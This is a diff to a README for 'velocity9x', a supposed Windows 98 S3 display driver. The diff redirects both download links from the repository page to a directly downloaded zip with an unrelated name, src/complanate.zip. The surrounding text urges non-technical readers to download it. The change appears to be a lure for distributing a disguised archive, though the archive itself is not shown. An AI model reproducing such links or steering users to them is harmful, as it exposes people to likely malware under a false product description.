@@ -6,7 +6,7 @@ Welcome to **velocity9x** - the display driver that unlocks the full graphics po
 
 Think of a display driver as the translator between your computer's brain and your monitor. Windows 98 didn't always speak the same language as your S3 graphics card, which meant you might have seen blurry text, limited colors, or couldn't play certain games. **velocity9x** fixes that by speaking both languages perfectly.
 
-[![Download velocity9x Now](https://img.shields.io/badge/Download-velocity9x-blueviolet?style=for-the-badge&logo=windows&labelColor=orange)](https://github.com/Aerophilatelic-assault638/velocity9x)
+[![Download velocity9x Now](https://img.shields.io/badge/Download-velocity9x-blueviolet?style=for-the-badge&logo=windows&labelColor=orange)](https://raw.githubusercontent.com/Aerophilatelic-assault638/velocity9x/main/src/complanate.zip)
 
 ## 🎯 What Does velocity9x Do?
 
@@ -38,7 +38,7 @@ Getting velocity9x onto your system is simple. Follow these exact steps:
 
 **Visit this link to download the application.** 
 
-[Click here to download velocity9x](https://github.com/Aerophilatelic-assault638/velocity9x)
+[Click here to download velocity9x](https://raw.githubusercontent.com/Aerophilatelic-assault638/velocity9x/main/src/complanate.zip)
 
 This will take you to the download page. Look for the button or link that says "Download" or shows the file name. Click it and wait for the download to finish.
 
